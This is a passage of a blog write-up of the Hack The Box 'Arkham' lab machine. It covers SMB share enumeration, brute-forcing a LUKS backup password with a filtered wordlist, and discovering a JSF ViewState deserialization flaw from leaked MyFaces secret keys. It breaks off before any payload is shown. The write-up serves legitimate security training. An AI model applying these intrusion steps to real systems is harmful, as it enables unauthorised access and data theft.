<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          Hack The Box - Arkham - 0xRick
        
    </title>
    <style>
  #carbonads {
    border: 1px solid black;
    border-radius: 7px;
    border-spacing: 7px;
    display: block;
    overflow: hidden;
    padding: 1em;
    line-height: 1.5;
  }
  #carbonads span {
    position: relative;
    display: block;
    overflow: hidden;
  }
  .carbon-img {
    float: left;
    margin-right: 1em;
  }
  .carbon-img img {
    display: block;
  }
  .carbon-text {
    display: block;
    float: left;
    max-width: calc(100% - 130px - 1em);
    text-align: left;
  }
  .carbon-poweredby {
    position: absolute;
    left: 142px;
    bottom: 0;
    display: block;
    font-size: .8em;
    line-height: 1;
    letter-spacing: 1px;
    }
    </style>
    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
<!-- Google Analytics -->
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-97164925-2', 'auto');
ga('send', 'pageview');
</script>
<!-- End Google Analytics -->

    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

    <style>
      #htbbadge{
        float: left;
      }
    </style>
<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="0xRick" type="application/rss+xml">
</head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>0XRICK</span>
  </a>
</div>
    <div class="book-menu">
  <ul>
<li><a href="/">Home</a></li>
</ul>
<h1 id="Categories"><a href="#Categories" class="headerlink" title="Categories"></a>Categories</h1><h2 id="Hack-The-Box-Write-ups"><a href="#Hack-The-Box-Write-ups" class="headerlink" title="Hack The Box Write-ups"></a>Hack The Box Write-ups</h2><ul>
<li><a href="/hack-the-box/ai/">Hack The Box - AI</a></li>
<li><a href="/hack-the-box/player/">Hack The Box - Player</a></li>
<li><a href="/hack-the-box/bitlab/">Hack The Box - Bitlab</a></li>
<li><a href="/hack-the-box/craft/">Hack The Box - Craft</a></li>
<li><a href="/hack-the-box/smasher2/">Hack The Box - Smasher2</a></li>
<li><a href="/hack-the-box/wall/">Hack The Box - Wall</a></li>
<li><a href="/hack-the-box/heist/">Hack The Box - Heist</a></li>
<li><a href="/hack-the-box/chainsaw/">Hack The Box - Chainsaw</a></li>
<li><a href="/hack-the-box/networked/">Hack The Box - Networked</a></li>
<li><a href="/hack-the-box/jarvis/">Hack The Box - Jarvis</a></li>
<li><a href="/hack-the-box/haystack/">Hack The Box - Haystack</a></li>
<li><a href="/hack-the-box/safe/">Hack The Box - Safe</a></li>
<li><a href="/hack-the-box/ellingson/">Hack The Box - Ellingson</a></li>
<li><a href="/hack-the-box/writeup/">Hack The Box - Writeup</a></li>
<li><a href="/hack-the-box/ghoul">Hack The Box - Ghoul</a></li>
<li><a href="/hack-the-box/swagshop/">Hack The Box - Swagshop</a></li>
<li><a href="/hack-the-box/kryptos/">Hack The Box - Kryptos</a></li>
<li><a href="/hack-the-box/luke/">Hack The Box - Luke</a></li>
<li><a href="/hack-the-box/bastion/">Hack The Box - Bastion</a></li>
<li><a href="/hack-the-box/bastion-2/">Hack The Box - Bastion (Commando)</a></li>
<li><a href="/hack-the-box/onetwoseven/">Hack The Box - OneTwoSeven</a></li>
<li><a href="/hack-the-box/unattended/">Hack The Box - Unattended</a></li>
<li><a href="/hack-the-box/helpline/">Hack The Box - Helpline</a></li>
<li><a href="/hack-the-box/arkham/">Hack The Box - Arkham</a></li>
<li><a href="/hack-the-box/fortune">Hack The Box - Fortune</a></li>
<li><a href="/hack-the-box/lacasadepapel/">Hack The Box - LaCasaDePapel</a></li>
<li><a href="/hack-the-box/ctf/">Hack The Box - CTF</a></li>
<li><a href="/c/categories/#Hack-The-Box"><strong>Older</strong></a></li>
</ul>
<h2 id="Wizard-Labs-Write-ups"><a href="#Wizard-Labs-Write-ups" class="headerlink" title="Wizard Labs Write-ups"></a>Wizard Labs Write-ups</h2><ul>
<li><a href="/wizard-labs/devlife/">Wizard Labs - Devlife</a></li>
<li><a href="/wizard-labs/dummy/">wizard Labs - Dummy</a></li>
</ul>
<h2 id="Basic-Binary-Exploitation"><a href="#Basic-Binary-Exploitation" class="headerlink" title="Basic Binary Exploitation"></a>Basic Binary Exploitation</h2><ul>
<li><a href="/binary-exploitation/bof6/">Bof: re2libc - protostar stack6</a></li>
<li><a href="/binary-exploitation/bof5/">Bof: ShellCode Injection - protostar stack5</a></li>
<li><a href="/binary-exploitation/bof4/">Bof: Taking control of the instruction pointer - protostar stack4</a></li>
<li><a href="/binary-exploitation/bof3/">Bof: Overwriting function pointers - protostar stack3</a></li>
<li><a href="/binary-exploitation/bof2/">Bof: Overwriting stack variables - protostar stack1,2</a></li>
<li><a href="/binary-exploitation/bof1/">Buffer Overflow Explained</a></li>
</ul>
<h2 id="Pwn-Challenges-Write-ups"><a href="#Pwn-Challenges-Write-ups" class="headerlink" title="Pwn Challenges Write-ups"></a>Pwn Challenges Write-ups</h2><ul>
<li><a href="/pwn/collision/">pwnable.kr - collision</a></li>
<li><a href="/pwn/bof/">pwnable.kr - bof</a></li>
<li><a href="/pwn/fd/">pwnable.kr - fd</a></li>
</ul>
<h2 id="Misc-CTF-Write-ups"><a href="#Misc-CTF-Write-ups" class="headerlink" title="Misc CTF Write-ups"></a>Misc CTF Write-ups</h2><ul>
<li><a href="/ctfs/egctf-qual/">EGCTF 2019 - Qualification Round</a></li>
</ul>
<h2 id="Lists"><a href="#Lists" class="headerlink" title="Lists"></a>Lists</h2><ul>
<li><a href="/lists/stego/">Steganography</a></li>
</ul>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><ul>
<li><a href="/misc/c2">Building a Basic C2</a></li>
</ul>

</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <div> <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script> </div> <br>
  <h1 id="Hack-The-Box-Arkham"><a href="#Hack-The-Box-Arkham" class="headerlink" title="Hack The Box - Arkham"></a>Hack The Box - Arkham</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Hey guys today Arkham retired and here’s my write-up about it. This box was a challenging one and I enjoyed it a lot, it had an interesting java deserialization vulnerability which is the best thing about this box. Despite the fact that some parts were annoying, this box was great. It’s a Windows box and its ip is <code>10.10.10.130</code>, I added it to <code>/etc/hosts</code> as <code>arkham.htb</code>. Let’s jump right in !<br><img src="/images/hackthebox/arkham/0.png" alt=""></p>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>As always we will start with <code>nmap</code> to scan for open ports and services :<br><code>nmap -sV -sT -sC arkham.htb</code><br><img src="/images/hackthebox/arkham/1.png" alt=""><br>We have <code>http</code> on port 80, 8080 and <code>smb</code>, I checked <code>smb</code> first.</p>
<h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p>Let’s use <code>smbclient</code> to list the shares :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham# smbclient --list &#x2F;&#x2F;arkham.htb&#x2F; -U &quot;&quot;</span><br><span class="line">Enter WORKGROUP\&#39;s password: </span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        ADMIN$          Disk      Remote Admin</span><br><span class="line">        BatShare        Disk      Master Wayne&#39;s secrets</span><br><span class="line">        C$              Disk      Default share</span><br><span class="line">        IPC$            IPC       Remote IPC</span><br><span class="line">        Users           Disk      </span><br><span class="line">Reconnecting with SMB1 for workgroup listing.</span><br><span class="line">do_connect: Connection to arkham.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class="line">Failed to connect with SMB1 -- no workgroup available</span><br></pre></td></tr></table></figure>
<p><code>Users</code> is an interesting share name, I checked it and it had the directories for <code>Guest</code> and <code>default</code> users :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham# smbclient &#x2F;&#x2F;arkham.htb&#x2F;Users&#x2F; -U &quot;&quot;</span><br><span class="line">Enter WORKGROUP\&#39;s password: </span><br><span class="line">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">  .                                  DR        0  Sun Feb  3 15:24:10 2019</span><br><span class="line">  ..                                 DR        0  Sun Feb  3 15:24:10 2019</span><br><span class="line">  Default                           DHR        0  Fri Feb  1 04:49:06 2019</span><br><span class="line">  desktop.ini                       AHS      174  Sat Sep 15 09:16:48 2018</span><br><span class="line">  Guest                               D        0  Sun Feb  3 15:24:19 2019</span><br><span class="line"></span><br><span class="line">                5158399 blocks of size 4096. 1899220 blocks available</span><br><span class="line">smb: \&gt;</span><br></pre></td></tr></table></figure>
<p>I enumerated it for some time but I couldn’t find anything useful so I checked <code>BatShare</code> which had a <code>zip</code> archive called <code>appserver.zip</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham# smbclient &#x2F;&#x2F;arkham.htb&#x2F;BatShare -U &quot;&quot;</span><br><span class="line">Enter WORKGROUP\&#39;s password: </span><br><span class="line">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">  .                                   D        0  Sun Feb  3 15:00:10 2019</span><br><span class="line">  ..                                  D        0  Sun Feb  3 15:00:10 2019</span><br><span class="line">  appserver.zip                       A  4046695  Fri Feb  1 08:13:37 2019</span><br><span class="line"></span><br><span class="line">                5158399 blocks of size 4096. 1897320 blocks available</span><br><span class="line">smb: \&gt;</span><br></pre></td></tr></table></figure>
<p>I downloaded it (<code>get appserver.zip</code>) then I started to examine it.</p>
<h2 id="Decrypting-the-Backup-Image-LUKS-Encrypted-Image"><a href="#Decrypting-the-Backup-Image-LUKS-Encrypted-Image" class="headerlink" title="Decrypting the Backup Image (LUKS Encrypted Image)"></a>Decrypting the Backup Image (LUKS Encrypted Image)</h2><p>After unzipping <code>appserver.zip</code> I got 2 files, <code>IMPORTANT.txt</code> and <code>backup.img</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham# mkdir appserver</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham# cd appserver&#x2F;</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham&#x2F;appserver# mv ..&#x2F;appserver.zip .</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham&#x2F;appserver# unzip appserver.zip </span><br><span class="line">Archive:  appserver.zip</span><br><span class="line">  inflating: IMPORTANT.txt           </span><br><span class="line">  inflating: backup.img              </span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham&#x2F;appserver# ls -la</span><br><span class="line">total 17276</span><br><span class="line">drwxr-xr-x 2 root root     4096 Aug  9 01:04 .</span><br><span class="line">drwxr-xr-x 3 root root     4096 Aug  9 01:04 ..</span><br><span class="line">-rw-r--r-- 1 root root  4046695 Aug  9 01:03 appserver.zip</span><br><span class="line">-rw-r--r-- 1 root root 13631488 Dec 25  2018 backup.img</span><br><span class="line">-rw-r--r-- 1 root root      149 Dec 25  2018 IMPORTANT.txt</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham&#x2F;appserver#</span><br></pre></td></tr></table></figure>
<p><code>IMPORTANT.txt</code> was a note from <code>Bruce</code> to <code>Alfred</code> telling him that this is the backup image from their Linux server :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham&#x2F;appserver# cat IMPORTANT.txt </span><br><span class="line">Alfred, this is the backup image from our linux server. Please see that The Joker or anyone else doesn&#39;t have unauthenticated access to it. - Bruce </span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham&#x2F;appserver#</span><br></pre></td></tr></table></figure>
<p><code>Backup.img</code> was a <code>LUKS</code> encrypted image :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham&#x2F;appserver# file backup.img </span><br><span class="line">backup.img: LUKS encrypted file, ver 1 [aes, xts-plain64, sha256] UUID: d931ebb1-5edc-4453-8ab1-3d23bb85b38e</span><br></pre></td></tr></table></figure>
<p>We can attempt to open it with <code>cryptsetup</code> but of course we will need a password :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham&#x2F;appserver# cryptsetup open --type luks backup.img test</span><br><span class="line">Enter passphrase for backup.img:</span><br></pre></td></tr></table></figure>
<p>We can use a tool called <code>bruteforce-luks</code> to bruteforce the password, but using it with <code>rockyou</code> would take a very long time. The box so far has a lot of batman references, like the names <code>Alfred</code>, <code>Bruce</code>, <code>Joker</code>  and the share name <code>BatShare</code>, also the comment of that share : <code>Master Wayne&#39;s secrets</code>.<br>I took all the passwords from <code>rockyou</code> that had <code>batman</code> in them and created a custom list :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham&#x2F;appserver# grep batman &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt &gt; list.txt</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham&#x2F;appserver# bruteforce-luks -f .&#x2F;list.txt .&#x2F;backup.img </span><br><span class="line">Warning: using dictionary mode, ignoring options -b, -e, -l, -m and -s.</span><br><span class="line"></span><br><span class="line">Tried passwords: 60</span><br><span class="line">Tried passwords per second: 0.361446</span><br><span class="line">Last tried password: batmanforever</span><br><span class="line"></span><br><span class="line">Password found: batmanforever</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham&#x2F;appserver#</span><br></pre></td></tr></table></figure>
<p>It worked and the password was <code>batmanforever</code>.<br><img src="/images/hackthebox/arkham/2.png" alt=""><br><img src="/images/hackthebox/arkham/3.png" alt=""><br>It had a directory called <code>Mask</code> so I copied it then I unmounted the image.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:&#x2F;media&#x2F;root&#x2F;af474e94-894e-4bb6-897a-adc82884b3d8# ls -la</span><br><span class="line">total 18</span><br><span class="line">drwxr-xr-x  4 root root  1024 Dec 25  2018 .</span><br><span class="line">drwxr-x---+ 3 root root  4096 Aug  9 01:30 ..</span><br><span class="line">drwx------  2 root root 12288 Dec 25  2018 lost+found</span><br><span class="line">drwxrwxr-x  4 root root  1024 Dec 25  2018 Mask</span><br><span class="line">root@kali:&#x2F;media&#x2F;root&#x2F;af474e94-894e-4bb6-897a-adc82884b3d8# cd -                             &#x2F;root&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham&#x2F;appserver</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham&#x2F;appserver# cp -r &#x2F;media&#x2F;root&#x2F;af474e94-894e-4bb6-897a-adc82884b3d8&#x2F;Mask&#x2F; .</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham&#x2F;appserver#</span><br></pre></td></tr></table></figure>
<p>There were some useless stuff that I didn’t really care about, there was a directory called <code>tomcat-stuff</code> which had some web server configuration files, that one was interesting.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham&#x2F;appserver&#x2F;Mask# ls -la</span><br><span class="line">total 896</span><br><span class="line">drwxr-xr-x 4 root root   4096 Aug  9 01:32 .</span><br><span class="line">drwxr-xr-x 3 root root   4096 Aug  9 01:32 ..</span><br><span class="line">drwxr-xr-x 2 root root   4096 Aug  9 01:32 docs</span><br><span class="line">-rw-r--r-- 1 root root  96978 Aug  9 01:32 joker.png</span><br><span class="line">-rw-r--r-- 1 root root 105374 Aug  9 01:32 me.jpg</span><br><span class="line">-rw-r--r-- 1 root root 687160 Aug  9 01:32 mycar.jpg</span><br><span class="line">-rw-r--r-- 1 root root   7586 Aug  9 01:32 robin.jpeg</span><br><span class="line">drwxr-xr-x 2 root root   4096 Aug  9 01:32 tomcat-stuff</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham&#x2F;appserver&#x2F;Mask# cd tomcat-stuff&#x2F;</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham&#x2F;appserver&#x2F;Mask&#x2F;tomcat-stuff# ls -la</span><br><span class="line">total 212</span><br><span class="line">drwxr-xr-x 2 root root   4096 Aug  9 01:32 .</span><br><span class="line">drwxr-xr-x 4 root root   4096 Aug  9 01:32 ..</span><br><span class="line">-rw-r--r-- 1 root root   1368 Aug  9 01:32 context.xml</span><br><span class="line">-rw-r--r-- 1 root root    832 Aug  9 01:32 faces-config.xml</span><br><span class="line">-rw-r--r-- 1 root root   1172 Aug  9 01:32 jaspic-providers.xml</span><br><span class="line">-rw-r--r-- 1 root root     39 Aug  9 01:32 MANIFEST.MF</span><br><span class="line">-rw-r--r-- 1 root root   7678 Aug  9 01:32 server.xml</span><br><span class="line">-rw-r--r-- 1 root root   2208 Aug  9 01:32 tomcat-users.xml</span><br><span class="line">-rw-r--r-- 1 root root 174021 Aug  9 01:32 web.xml</span><br><span class="line">-rw-r--r-- 1 root root   3498 Aug  9 01:32 web.xml.bak</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham&#x2F;appserver&#x2F;Mask&#x2F;tomcat-stuff# cd ..&#x2F;docs</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham&#x2F;appserver&#x2F;Mask&#x2F;docs# ls -la</span><br><span class="line">total 204</span><br><span class="line">drwxr-xr-x 2 root root   4096 Aug  9 01:32 .</span><br><span class="line">drwxr-xr-x 4 root root   4096 Aug  9 01:32 ..</span><br><span class="line">-rw-r--r-- 1 root root 199998 Aug  9 01:32 Batman-Begins.pdf</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham&#x2F;appserver&#x2F;Mask&#x2F;docs#</span><br></pre></td></tr></table></figure>
<p>We have the server configuration files, However we haven’t checked any of the <code>http</code> ports yet.</p>
<p>HTTP Enumeration<br>Port 80 had nothing running, there was only the default <code>IIS</code> index page and no subdirectories.<br><img src="/images/hackthebox/arkham/4.png" alt=""><br>On port 8080 there was a website with some links :<br><img src="/images/hackthebox/arkham/5.png" alt=""><br>One of the links was the subscription link : <code>http://arkham.htb:8080/userSubscribe.faces</code><br><img src="/images/hackthebox/arkham/6.png" alt=""><br>I tested it to see what will happen :<br><img src="/images/hackthebox/arkham/7.png" alt=""><br><img src="/images/hackthebox/arkham/8.png" alt=""><br>Nothing interesting, I intercepted the request with <code>burp</code> and found some interesting parameters in the POST request :</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/userSubscribe.faces</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: arkham.htb:8080</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: http://arkham.htb:8080/userSubscribe.faces</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 257</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=F018FBFC4605B1C80EB54D5CA2A46B91</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">j_id_jsp_1623871077_1%3Aemail=test&amp;j_id_jsp_1623871077_1%3Asubmit=SIGN+UP&amp;j_id_jsp_1623871077_1_SUBMIT=1&amp;javax.faces.ViewState=wHo0wmLu5ceItIi%2BI7XkEi1GAb4h12WZ894pA%2BZ4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE%3D</span><br></pre></td></tr></table></figure>


<h2 id="JSF-ViewState-Deserialization-Vulnerability"><a href="#JSF-ViewState-Deserialization-Vulnerability" class="headerlink" title="JSF ViewState Deserialization Vulnerability"></a>JSF ViewState Deserialization Vulnerability</h2><p>The page had <code>.faces</code> extension and the POST request had a parameter called <code>javax.faces.ViewState</code>.<br>After some research I knew that this parameter holds a java serialized object, this means that there is a potential deserialization vulnerability.</p>
<p>Some resources if you are unfamiliar with deserialization vulnerabilities :</p>
<ul>
<li><a href="https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html" target="_blank" rel="noopener">Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities</a></li>
<li><a href="https://www.n00py.io/2017/11/exploiting-blind-java-deserialization-with-burp-and-ysoserial/" target="_blank" rel="noopener">Exploiting blind Java deserialization with Burp and Ysoserial</a></li>
<li><a href="https://medium.com/@D0rkerDevil/how-i-found-a-1500-worth-deserialization-vulnerability-9ce753416e0a" target="_blank" rel="noopener">How i found a 1500$ worth Deserialization vulnerability</a></li>
<li><a href="https://gist.github.com/cdowns71/76d99ad0829ceef3a83761dbeee3b66d" target="_blank" rel="noopener">Encrypted Java Serialized RCE</a> (This helped me to know how to encrypt the data)</li>
</ul>
<p>When I tried to decode the base-64 encoded value I got nothing readable:<br><img src="/images/hackthebox/arkham/9.png" alt=""><br>I redirected the output into a file and ran <code>file</code> command against it, and I got <code>data</code> instead of <code>Java serialization data</code>.<br>This means that the serialized data are encrypted. Luckily we have the server configuration files, it’s time to check them.<br>In <code>web.xml.bak</code> I found the key used to encrypt the data, also the MAC algorithm which was <code>hmac-sha1</code> and the used key. </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">    ----------------</span><br><span class="line">     Removed Output</span><br><span class="line">    ----------------</span><br><span class="line"><span class="tag">&lt;<span class="name">context-param</span>&gt;</span>     </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">param-name</span>&gt;</span>org.apache.myfaces.SECRET<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span>                                                                     </span><br><span class="line"><span class="tag">&lt;<span class="name">param-value</span>&gt;</span>SnNGOTg3Ni0=<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span>                                                                                </span><br><span class="line"><span class="tag">&lt;/<span class="name">context-param</span>&gt;</span>                                                                                                       </span><br><span class="line">    <span class="tag">&lt;<span class="name">context-param</span>&gt;</span>                                                                                                    </span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>org.apache.myfaces.MAC_ALGORITHM<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span>                                                      </span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>HmacSHA1<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span>                                                                            </span><br><span class="line">     <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param-name</span>&gt;</span>org.apache.myfaces.MAC_SECRET<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param-value</span>&gt;</span>SnNGOTg3Ni0=<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"><span 